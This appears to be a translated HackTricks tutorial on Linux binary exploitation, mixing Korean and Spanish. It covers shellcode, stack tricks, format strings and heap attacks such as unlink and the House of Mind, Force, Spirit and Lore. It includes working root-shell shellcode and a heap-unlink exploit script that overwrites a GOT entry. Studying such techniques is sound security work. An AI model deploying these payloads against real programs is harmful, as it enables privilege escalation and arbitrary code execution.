# 리눅스 Exploiting (기본) (SPA)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드하길 원한다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [telegram 그룹](https://t.me/peass)에 **가입**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
* **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** —> Nos devuelve un .o\
**ld assembly.o -o shellcodeout** —> Nos da un ejecutable formado por el código ensamblador y podemos sacar los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** —> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes

**Comprobar que la shellcode funciona**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
시스템 호출이 올바르게 이루어졌는지 확인하려면 이전 프로그램을 컴파일하고 시스템 호출이 **strace ./COMPILADO_프로그램**에 나타나야 합니다.

쉘코드를 작성할 때 한 가지 트릭을 사용할 수 있습니다. 첫 번째 명령은 call로 이어지는 점프입니다. Call은 원래 코드를 호출하고 EIP를 스택에 넣습니다. Call 명령 다음에 필요한 문자열을 넣었으므로 해당 EIP로 문자열을 가리킬 수 있으며 코드 실행을 계속할 수 있습니다.

예: **트릭 (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**/bin/sh를 사용한 EJ:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**  
EJ FNSTENV는 ESP 레지스터를 복사하고, 현재 스택 포인터를 저장하는 명령어입니다.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter:**

프로세스와 관련된 메모리 페이지를 탐색하여 거기에 저장된 셸코드를 찾는 작은 코드입니다 (셸코드에 넣은 특정 서명을 찾습니다). 코드를 주입할 공간이 매우 작은 경우 유용합니다.

**다형 셸코드**

암호화된 셸로, 해독하고 해당 위치로 점프하는 작은 코드가 포함되어 있습니다. Call-Pop 트릭을 사용하는 **시저 암호화된 예제**가 있습니다:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5. 보충 기법**

**Ret2Ret**

EIP에 스택 주소를 넣을 수 없거나 (EIP에 0xbf가 포함되어 있지 않음을 확인) 또는 shellcode의 위치를 계산할 수 없을 때 유용합니다. 그러나 취약한 함수가 매개변수를 수용하는 경우 (shellcode가 여기에 들어갑니다).

이렇게 하면 EIP를 **ret** 주소로 변경하면 다음 주소가로 로드됩니다 (이는 함수의 첫 번째 인수의 주소입니다). 즉, shellcode가 로드됩니다.

Exploit은 다음과 같습니다: SHELLCODE + 패딩 (EIP까지) + **\&ret** (스택에 매개변수 주소가 들어가므로 스택의 다음 바이트는 shellcode의 시작을 가리킵니다)

**strncpy**와 같은 함수는 완료되면 쉘코드가 저장된 주소를 스택에서 제거하여 이 기술을 불가능하게 합니다. 즉, 함수에 전달된 주소 (쉘코드를 저장하는 주소)는 0x00으로 수정되어 두 번째 **ret**를 호출할 때 0x00을 만나 프로그램이 종료됩니다.



**Murat 기법**

Linux에서 모든 프로그램은 0xbfffffff에서 매핑됩니다.

Linux에서 새 프로세스의 스택이 어떻게 구성되는지 살펴보면 프로그램이 쉘코드만 포함된 환경에서 시작되도록 exploit을 개발할 수 있습니다. 따라서 쉘코드가 있는 환경 변수의 주소는 다음과 같이 계산할 수 있습니다: addr = 0xbfffffff - 4 - strlen(FULL\_EXECUTABLE\_NAME) - strlen(shellcode)

이렇게 하면 쉘코드가 있는 환경 변수의 주소를 쉽게 얻을 수 있습니다.

이것은 execle 함수가 원하는 환경 변수만을 가진 환경을 만들 수 있기 때문에 가능합니다.

**Jump to ESP: Windows Style**

ESP가 항상 스택의 시작을 가리키고 있기 때문에, 이 기술은 EIP를 **jmp esp** 또는 **call esp** 호출로 대체하는 것으로 구성됩니다. 이렇게 하면 EIP를 덮어쓴 후에도 shellcode가 저장되어 있으며, **ret**를 실행한 후 ESP는 바로 다음 주소를 가리키게 됩니다. 즉, shellcode가 저장된 곳입니다.

Windows 또는 Linux에서 ASLR이 활성화되어 있지 않은 경우, 공유된 객체에 저장된 **jmp esp** 또는 **call esp**를 호출할 수 있습니다. ASLR이 활성화된 경우, 취약한 프로그램 내에서 찾을 수 있습니다.

또한, 함수의 EIP 손상 후에 shellcode를 배치할 수 있기 때문에, 함수 스택 중간에 놓는 대신 shellcode를 덮어쓸 수 있는 push 또는 pop 명령이 실행되지 않도록 할 수 있습니다.

이와 매우 유사하게, 함수가 쉘코드가 저장된 위치를 반환하는 경우 **call eax** 또는 **jmp eax (ret2eax)**를 호출할 수 있습니다.

**정수 오버플로우**

이 유형의 오버플로우는 변수가 전달된 숫자만큼 큰 수를 처리할 수 없을 때 발생하며, 부호 있는 변수와 부호 없는 변수 사이의 혼란으로 인해 발생할 수 있습니다.
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
이전 예제에서 볼 수 있듯이 프로그램은 2개의 매개변수를 예상합니다. 첫 번째는 다음 문자열의 길이이고 두 번째는 문자열입니다.

첫 번째 매개변수로 음수를 전달하면 len < 256이라는 메시지가 표시되어 해당 필터를 통과하게 되며, 또한 strlen(buffer)도 l보다 작을 것이며, l은 unsigned int이므로 매우 크게 될 것입니다.

이러한 종류의 오버플로우는 프로그램의 프로세스에 무언가를 쓰려는 것이 아니라, 다른 취약점을 악용하기 위해 잘못 설계된 필터를 우회하려는 것입니다.

**초기화되지 않은 변수**

초기화되지 않은 변수가 취할 수 있는 값은 알 수 없으며, 이를 관찰하는 것이 흥미로울 수 있습니다. 이전 함수의 변수가 취했던 값이 취할 수도 있으며, 이는 공격자가 제어할 수 있습니다.

##

###

###

###

### **.fini\_array**

본질적으로 이는 **프로그램이 끝나기 전에 호출될 함수들을 포함하는 구조**입니다. 이는 **주소로 점프하여 쉘코드를 호출**하거나 형식 문자열을 **두 번째로 악용하기 위해 다시 main으로 돌아가야 하는 경우**에 유용합니다.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
이것은 **영원한 루프**를 **생성하지 않습니다**. 왜냐하면 메인으로 돌아가면 canary가 감지하여 스택의 끝이 손상되어 함수가 다시 호출되지 않을 수 있습니다. 따라서 이를 통해 취약점을 **1번 더 실행**할 수 있습니다.

### **콘텐츠 덤프를 위한 형식 문자열**

형식 문자열은 프로그램의 메모리에서 **콘텐츠를 덤프**하는 데 악용될 수 있습니다.\
예를 들어, 다음 상황에서는 **플래그를 가리키는 스택의 로컬 변수**가 있습니다. **메모리**에서 **플래그를 가리키는 포인터**가 어디에 있는지 **찾으면**, **printf가 해당 주소에 액세스**하고 **플래그를 출력**할 수 있습니다:

그래서, 플래그는 **0xffffcf4c**에 있습니다.

![](<../../.gitbook/assets/image (618) (2).png>)

그리고 누출에서 **플래그를 가리키는 포인터**가 **8번째** 매개변수에 있는 것을 볼 수 있습니다:

![](<../../.gitbook/assets/image (623).png>)

따라서 **8번째 매개변수에 액세스**하여 플래그를 얻을 수 있습니다:

![](<../../.gitbook/assets/image (624).png>)

**이전 exploit을 따라가고 콘텐츠를 누출할 수 있음을 깨달았다면**, **`printf`**에 **포인터를 설정**하여 **실행 파일이 로드된 섹션**으로 이동하여 **전체적으로 덤프**할 수 있습니다!

### **DTOR**

{% hint style="danger" %}
요즘에는 **dtor 섹션을 가진 이진 파일을 찾기가 매우 이상합니다**.
{% endhint %}

소멸자는 프로그램이 종료되기 전에 **실행되는 함수**입니다.\
**`__DTOR_END__`**에 **쉘코드의 주소를 쓰는 데 성공**하면, 그것은 프로그램이 끝나기 전에 **실행**될 것입니다.\
이 섹션의 주소를 얻으려면:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
보통 **DTOR** 섹션은 `ffffffff`와 `00000000` 값 사이에 있습니다. 그러므로 이 값만 보인다면, **등록된 함수가 없다는 것**을 의미합니다. 따라서 **`00000000`**을 **쉘코드의 주소로 덮어씌우세요**.

### **포맷 문자열을 이용한 버퍼 오버플로우**

**sprintf**는 형식화된 문자열을 **변수에** 이동시킵니다. 따라서 문자열의 **형식을 남용**하여 복사된 내용이 있는 변수에서 **버퍼 오버플로우를 유발**할 수 있습니다.\
예를 들어, 페이로드 `%.44xAAAA`는 변수에 **44바이트+"AAAA"를 쓸 것**이며, 이는 버퍼 오버플로우를 일으킬 수 있습니다.

### **\_\_atexit 구조체**

{% hint style="danger" %}
현재는 이를 **악용하는 것이 매우 이상합니다**.
{% endhint %}

**`atexit()`**은 **매개변수로 전달된 다른 함수들을** 실행합니다. 이러한 **함수들**은 **`exit()`를 실행하거나 main이 반환될 때 실행**됩니다.\
예를 들어, 이러한 **함수들** 중 **어떤 것의 주소를 수정**하여 쉘코드를 가리키도록 한다면, **프로세스를 제어**할 수 있지만 현재 이 작업은 더 복잡해졌습니다.\
현재 **실행될 함수들의 주소**는 여러 구조체 뒤에 숨겨져 있으며, 마지막으로 그 주소는 함수들의 주소가 아니라 **XOR로 암호화되고 무작위 키로 이동**됩니다. 따라서 현재 이 공격 벡터는 **적어도 x86** 및 **x64\_86**에서는 그다지 유용하지 않습니다.\
**암호화 함수**는 **`PTR_MANGLE`**입니다. **m68k, mips32, mips64, aarch64, arm, hppa**와 같은 **다른 아키텍처**는 이 **암호화 함수를 구현하지 않습니다**. 따라서 이러한 아키텍처는 이 벡터에 의해 공격당할 수 있습니다.

### **setjmp() & longjmp()**

{% hint style="danger" %}
현재는 이를 **악용하는 것이 매우 이상합니다**.
{% endhint %}

**`Setjmp()`**는 **컨텍스트(레지스터)를 저장**할 수 있습니다.\
**`longjmp()`**는 **컨텍스트를 복원**할 수 있습니다.\
저장된 레지스터는 `EBX, ESI, EDI, ESP, EIP, EBP`입니다.\
그러나 EIP와 ESP는 **`PTR_MANGLE`** 함수를 통해 전달되므로, **이 공격에 취약한 아키텍처는 위와 동일**합니다.\
이러한 함수들은 오류 복구나 인터럽트에 유용합니다.\
그러나 제가 읽은 바에 따르면, 다른 레지스터는 보호되지 않습니다. 따라서 호출되는 함수 내부에 `call ebx`, `call esi` 또는 `call edi`가 있다면 제어를 얻을 수 있습니다. 또는 EBP를 수정하여 ESP를 수정할 수도 있습니다.

**C++에서의 VTable 및 VPTR**

각 클래스에는 **메서드에 대한 포인터 배열인 Vtable**이 있습니다.

각 **클래스**의 객체에는 해당 클래스의 배열을 가리키는 **포인터인 VPtr**이 있습니다. VPtr은 각 객체의 헤더의 일부이므로 VPtr을 덮어쓰면 더미 메서드를 가리키도록 수정하여 함수를 실행하면 쉘코드로 이동할 수 있습니다.

## **예방 및 회피 조치**

###

**Libsafe 대체**

다음과 같이 활성화됩니다: LD\_PRELOAD=/lib/libsafe.so.2\
또는\
“/lib/libsave.so.2” > /etc/ld.so.preload

일부 안전하지 않은 함수 호출을 안전한 함수 호출로 대체합니다. 표준화되어 있지 않습니다. (x86 전용, -fomit-frame-pointer로 컴파일된 것은 해당되지 않음, 정적 컴파일은 해당되지 않음, 모든 취약한 함수가 안전한 함수로 변환되지 않음, LD\_PRELOAD는 setuid 바이너리에서 작동하지 않음).

**ASCII Armored Address Space**

공유 라이브러리를 0x00000000에서 0x00ffffff로 로드하여 항상 0x00 바이트가 있도록 합니다. 그러나 이는 실제로 거의 모든 공격을 막지 못하며, 리틀 엔디안에서는 특히 그렇습니다.

**ret2plt**

strcpy@plt 함수를 호출하고 GOT의 항목을 가리키도록 하여 호출하려는 함수(system())의 첫 번째 바이트를 복사하는 방식으로 ROP를 수행하는 것입니다. 그런 다음 GOT+1을 가리키도록 하여 system()의 두 번째 바이트를 복사합니다. 마지막으로 GOT에 저장된 주소(system()일 것)를 호출합니다.

**chroot()로 감옥 만들기**

debootstrap -arch=i386 hardy /home/user —> 특정 하위 디렉토리에 기본 시스템을 설치합니다.

관리자는 이러한 감옥을 빠져나가기 위해 다음을 수행할 수 있습니다: mkdir foo; chroot foo; cd ..

**코드 인스트루먼테이션**

Valgrind —> 오류 찾기\
Memcheck\
RAD (Return Address Defender)\
Insure++
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #이전 청크가 비어 있다고 표시하는 비트가 1인 것이 중요**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, 3번째 청크의 "size"가 4바이트 뒤에 있다고 생각하게끔 함 (prev\_size를 가리킴)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #페이로드의 처음에 8바이트의 채우기를 넣음**

**got\_free = pack("\<I", 0x08048300 - 12) #plt의 free() 주소-12 (free가 두 번째 호출될 때 shellcode가 실행되도록 덮어씌워질 주소)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #페이로드는 8바이트의 채우기로 시작함**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #두 번째 청크를 수정하고, got\_free는 addr\_sc + 12 주소를 저장할 위치를 가리킴**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

우리는 연속적으로 3개의 청크를 제어하고, 그들은 예약된 순서의 역순으로 해제됩니다.

이 경우:

청크 c에 shellcode를 넣습니다.

청크 a를 사용하여 b를 덮어쓰기하여 size가 PREV\_INUSE 비트가 꺼져 있어 청크 a가 비어 있다고 생각하게 합니다.

또한, 헤더 b의 size를 -4로 덮어씁니다.

그러면 프로그램은 "a"가 비어 있고 bin에 있는 것으로 생각하여 unlink()를 호출합니다. 그러나 헤더 PREV\_SIZE가 -4이므로 "a" 청크가 실제로 b+4에서 시작한다고 생각합니다. 즉, b+4에서 시작하는 청크를 unlink()하게 되며, 따라서 b+12에는 "fd" 포인터가 있고 b+16에는 "bk" 포인터가 있습니다.

따라서, bk에는 shellcode 주소를, fd에는 "puts()" 함수 주소-12를 넣으면 페이로드가 완성됩니다.

**Frontlink 기법**

해제된 것이 있고 인접한 청크가 모두 비어 있지 않은 경우 unlink()가 호출되지 않고 직접 frontlink()가 호출됩니다.

공격 대상이 되는 malloc이 결코 해제되지 않을 때 유용한 취약점입니다.

필요한 것:

데이터 입력 함수로 오버플로우가 발생할 수 있는 버퍼

해제되어야 하는 인접한 버퍼로, 이전 버퍼의 오버플로우로 인해 헤더의 fd 필드가 수정됩니다.

512보다 크고 이전 버퍼보다 작은 크기의 버퍼

3단계 이전에 선언된 버퍼로 이 버퍼의 prev\_size를 덮어쓸 수 있어야 합니다.

이렇게 함으로써 두 개의 malloc을 무질서하게 덮어쓰고 하나는 제어된 상태로 해제되는 exploit을 수행할 수 있습니다.

**Double free() 취약점**

동일한 포인터로 두 번 free()를 호출하면 두 개의 bin이 동일한 주소를 가리키게 됩니다.

하나를 다시 사용하려면 문제가 없이 할당됩니다. 다른 것을 사용하려면 이전 예약에서 작성된 데이터로 "fd"와 "bk" 포인터가 왜곡됩니다.

**After free()**

이전에 해제된 포인터가 제어 없이 다시 사용됩니다.

## **8 Heap Overflows: Exploits avanzados**

unlink() 및 FrontLink() 기술은 unlink() 함수를 수정함으로써 제거되었습니다.

**The house of mind**

임의 코드 실행을 유발하기 위해 free()를 한 번 호출하는 것만으로 충분합니다. 이전에 오버플로우될 수 있는 두 번째 청크를 찾고 해제될 수 있어야 합니다.

free()를 호출하면 public\_fREe(mem)이 호출됩니다. 이 함수는 다음과 같은 작업을 수행합니다:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> 청크가 시작하는 위치를 가리키는 포인터를 반환합니다 (mem-8)

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1]에서 NON\_MAIN\_ARENA 비트를 확인하여 true를 반환하고 heap\_for\_ptr()를 실행하도록 변경할 수 있습니다. 이렇게 하면 "mem"에 AND를 적용하여 가장 중요하지 않은 2.5바이트를 0으로 만들고 0x08000000에 액세스하여 0x08000000->ar\_ptr(구조체 heap\_info처럼)에 액세스합니다.

따라서 예를 들어 0x0804a000에 청크를 제어하고 **0x081002a0**에 청크를 해제할 수 있다면 0x08100000으로 이동하여 원하는 내용을 쓸 수 있습니다. 예를 들어 **0x0804a000**을 쓸 수 있습니다. 두 번째 청크가 해제되면 heap\_for\_ptr(ptr)->ar\_ptr이 0x08100000에 쓴 내용을 반환할 것입니다 (0x081002a0에 AND가 적용되고 그 값에서 처음 4바이트의 값을 가져오기 때문입니다).

\_int\_free(ar\_ptr, mem)를 호출하게 되며, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

앞에서 본 대로 av의 값을 제어할 수 있기 때문에 av에 쓴 값을 제어할 수 있습니다.

unsorted\_chunks가 정의된 대로 알 수 있습니다:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

따라서 av->bins\[2]에 \_\_DTOR\_END\_\_-12의 값을 쓰면 마지막 명령에서 \_\_DTOR\_END\_\_에 두 번째 청크의 prev\_size 주소가 쓰입니다.

즉, 첫 번째 청크에는 av->bins\[2]에서 많은 양의 \_\_DTOR\_END\_\_-12 주소를 넣어야 합니다. av->bins\[2]에서 값을 가져오기 때문입니다.

두 번째 청크에서는 prev\_size를 jump 0x0c로 덮어쓰고 size를 NON\_MAIN\_ARENA로 활성화하기 위해 값을 써야 합니다.

다음으로 많은 nops를 넣고 마지막으로 shellcode를 넣습니다.

이렇게 하면 \_int\_free(TROZO1, TROZO2)가 호출되고 \_\_DTOR\_END\_\_의 주소가 TROZO2의 prev\_size로 쓰이며 shellcode로 이동합니다.
이 기술을 적용하려면 페이로드를 약간 더 복잡하게 만드는 몇 가지 요구 사항을 충족해야합니다.

이 기술은 더 이상 적용되지 않습니다. unlink에 대한 거의 동일한 패치가 적용되었기 때문입니다. 새로 가리키는 사이트가 자신을 가리키고 있는지 확인됩니다.

**Fastbin**

The house of mind의 변형입니다.

우리는 \_int\_free() 함수의 첫 번째 확인 후에 다음 코드를 실행하고 싶어합니다.

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

이렇게 함으로써 "fb"에 함수의 주소가 주어지고, 이 주소에 덮어쓰기 할 조각의 주소가 들어갑니다. 이를 위해서는 아레나가 dtors 주소 근처에 있어야합니다. 더 정확히 말하면 av->max\_fast가 덮어쓸 주소에 있어야합니다.

The House of Mind에서 우리가 av의 위치를 제어할 수 있다는 것을 알았기 때문에,

size 필드에 8 + NON\_MAIN\_ARENA + PREV\_INUSE를 넣으면 fastbin\_index()가 fastbins\[-1\]을 반환하고, 이는 av->max\_fast를 가리킵니다.

이 경우 av->max\_fast가 덮어쓰여질 주소가 될 것입니다.

또한, 해제된 인접 조각은 8보다 커야합니다. - 해제된 조각의 크기가 8이라고 했으므로, 이 가짜 조각에는 8보다 큰 크기를 넣어야합니다 (또한 쉘코드가 해제된 조각에 들어갈 것이므로, 처음에는 nops로 떨어지는 jmp를 넣어야합니다).

또한, 이 가짜 조각은 av->system\_mem보다 작아야합니다. av->system\_mem은 1848바이트 떨어진 곳에 있습니다.

\_DTOR\_END\_의 널 값과 GOT의 적은 주소로 인해, 이러한 섹션의 어떤 주소도 덮어쓰기에 적합하지 않습니다. 따라서 스택을 공격하기 위해 fastbin을 어떻게 적용할지 살펴보겠습니다.

다른 공격 방법은 **av**를 스택으로 리다이렉션하는 것입니다.

size를 8이 아닌 16으로 변경하면 fastbin\_index()가 fastbins\[0\]을 반환하고, 이를 사용하여 스택을 덮어쓸 수 있습니다.

이를 위해서는 스택에 canary나 이상한 값이 없어야하며, 실제로 여기에 있어야합니다: 4바이트 널 + EBP + RET

4바이트 널은 **av**가 이 주소에 있어야하며, **av**의 첫 번째 요소는 0이어야합니다.

**av->max\_fast**는 EBP가되며 제한 사항을 우회하는 데 사용되는 값입니다.

**av->fastbins\[0\]**에는 **p**의 주소가 덮어쓰여지며 RET이되어 쉘코드로 이동합니다.

또한, **av->system\_mem** (스택 위치에서 1484바이트 위)에는 우리가 수행할 확인을 우회하는 데 도움이 되는 많은 쓰레기가 있어야합니다.

또한, 해제된 인접 조각은 8보다 커야합니다. - 해제된 조각의 크기가 16이라고 했으므로, 이 가짜 조각에는 8보다 큰 크기를 넣어야합니다 (또한 쉘코드가 해제된 조각에 들어갈 것이므로, 처음에는 새로운 가짜 조각의 size 필드 뒤에 오는 nops로 떨어지는 jmp를 넣어야합니다).

**The House of Spirit**

이 경우에는 공격자가 조작 가능한 malloc 포인터를 가져야합니다 (예: 포인터가 변수 오버플로우 아래 스택에 있는 경우).

따라서이 포인터가 원하는 곳을 가리키도록 할 수 있습니다. 그러나 모든 위치가 유효한 것은 아닙니다. 가짜 조각의 크기는 av->max\_fast보다 작아야하며, 미래의 malloc() 호출에 요청된 크기와 정확히 같아야합니다. 따라서, 이 취약한 포인터 뒤에 malloc(40)이 호출된다고 가정하면, 가짜 조각의 크기는 48과 같아야합니다.

예를 들어 프로그램이 사용자에게 숫자를 묻는 경우 48을 입력하고 malloc 포인터를 다음 4바이트에 가리키도록 할 수 있습니다 (이는 운이 좋다면 EBP에 속할 수 있으므로, 48이 뒤에 남게됩니다. 마치 헤더 크기처럼). 또한, ptr-4+48 주소는 여러 조건을 충족해야합니다 (이 경우 ptr=EBP), 즉, 8 < ptr-4+48 < av->system\_mem.

이 조건이 충족되면, 우리가 말한 malloc(40)이 호출될 때 EBP의 주소가 할당됩니다. 공격자가이 malloc에 쓰여진 내용을 제어할 수있는 경우 EBP 및 EIP를 원하는 주소로 덮어쓸 수 있습니다.

이것은 free()가 스택의 EBP를 가리키는 주소에 새로운 malloc()에 대한 완벽한 크기의 조각이 있다는 것을 저장하기 때문이라고 생각합니다. 따라서 그 주소를 할당합니다.

**The House of Force**

필요한 것:

* wilderness를 덮어쓸 수있는 조각에 대한 오버플로우
* 사용자가 정의한 크기로 malloc()를 호출
* 사용자가 정의한 데이터로 malloc()를 호출

첫 번째로 wilderness 조각의 크기를 매우 큰 값 (0xffffffff)으로 덮어씁니다. 따라서 충분히 큰 메모리 요청은 힙을 확장하지 않고 \_int\_malloc()에서 처리됩니다.

두 번째로 av->top을 공격자가 제어하는 메모리 영역 (예: 스택)을 가리키도록 변경합니다. av->top에는 \&EIP - 8이 들어갑니다.

공격자가 제어하는 메모리 영역을 가리키도록 av->top을 덮어씌워야합니다:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim은 현재 wilderness 조각의 주소 (현재 av->top)를 수집하고, remainder는 해당 주소와 malloc()에 의해 요청된 바이트 수의 합입니다. 따라서 \&EIP-8이 0xbffff224에 있고 av->top에 0x080c2788이 포함되어 있으면, av->top이 다음 malloc()에 대해 $EIP-8을 가리키도록 제어 가능한 malloc에 예약해야하는 바이트 수는 다음과 같습니다:

0xbffff224 - 0x080c2788 = 3086207644.

따라서 변경된 값을 av->top에 저장하고 다음 malloc이 EIP를 가리키고 덮어쓸 수 있습니다.

새로운 wilderness 조각의 크기가 마지막 malloc()에 의해 요청된 크기보다 커야합니다. 즉, wilderness가 \&EIP-8을 가리키고 있다면, 크기는 정확히 스택의 EBP 필드에 있게됩니다.

**The House of Lore**

**SmallBin 손상**

해제된 조각은 크기에 따라 bin에 넣습니다. 그러나 unsorted bins에 먼저 저장됩니다. 조각이 해제되면 즉시 해당 bin에 넣지 않고 unsorted bins에 남아 있습니다. 그런 다음 새로운 조각을 예약하고 이전에 해제된 조각이 유용하면 반환되지만 더 큰 조각을 예약하면 unsorted bins에 있는 조각이 해당하는 적절한 bin에 넣어집니다.

취약한 코드에 도달하려면 메모리 요청이 av->max\_fast(보통 72)보다 커야하고 MIN\_LARGE\_SIZE(512)보다 작아야합니다.

bin에 적합한 크기의 조각이 있으면 해당 조각을 반환하고 다음 작업을 수행합니다:

bck = victim->bk; 이전 조각을 가리킵니다. 우리가 변경할 수있는 유일한 정보입니다.

bin->bk = bck; 뒤에서 두 번째 조각이 마지막이되며, bck가 스택을 가리키면 다음 예약된 조각이 이 주소를 받게됩니다.

bck->fd = bin; 이를 통해이가 bin을 가리키도록하여 목록이 닫힙니다.

필요한 것:
두 개의 malloc이 예약되어야 하며, 첫 번째 malloc에 오버플로우를 발생시킬 수 있어야 하며, 두 번째 malloc이 해제되고 해당 bin에 들어간 후에 오버플로우가 발생해야 합니다 (즉, 오버플로우하기 전에 두 번째 조각보다 큰 malloc이 예약되어야 함).

공격자가 선택한 주소를 가리키는 malloc이 공격자에 의해 제어되어야 합니다.

목표는 다음과 같습니다. 이미 해제되어 bin에 있는 하위 조각을 오버플로우할 수 있다면, 해당 조각의 bk 포인터를 수정할 수 있습니다. bk 포인터를 수정하고 해당 조각이 bin 목록의 첫 번째로 되어 다시 예약되면, bin을 속일 수 있고, bin에게 다음으로 제공할 조각이 가짜 주소 (예: 스택 또는 GOT)에 있다고 알릴 수 있습니다. 따라서 다른 조각이 다시 예약되고 공격자가 해당 조각에 권한이 있다면, 원하는 위치에 조각이 제공되고 해당 위치에 쓸 수 있습니다.

수정된 조각을 해제한 후 해제된 조각보다 큰 조각을 예약해야 하며, 이렇게 하면 수정된 조각이 unsorted bins에서 나오고 해당 bin에 들어갈 것입니다.

한 번 bin에 들어가면 오버플로우를 통해 bk 포인터를 수정하여 원하는 주소를 가리키도록해야 합니다.

